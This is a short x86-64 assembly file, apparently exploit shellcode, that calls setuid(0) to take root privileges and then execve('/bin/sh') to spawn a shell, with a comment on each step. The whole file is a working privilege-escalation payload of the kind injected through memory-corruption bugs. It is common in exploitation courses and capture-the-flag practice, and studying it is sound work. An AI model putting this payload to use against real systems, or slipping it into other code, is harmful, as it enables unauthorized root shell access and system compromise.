.global _start
_start:
.intel_syntax noprefix
    # setuid
    mov rax, 0x69                   # syscall for 'setuid'
    mov rdi, 0                      # set 'uid' to 0
    syscall

    # pop shell with execve
    mov rbx, 0x0068732f6e69622f     # mov "/bin/sh\0" into rbx
    push rbx                        # push "/bin/sh\0" onto the stack
    mov rdi, rsp                    # point rdi at the stack
    mov rax, 0x3b                   # syscall for 'execve'
    mov rsi, 0                      # set 'argv' to NULL
    mov rdx, 0                      # set 'envp' to NULL
    syscall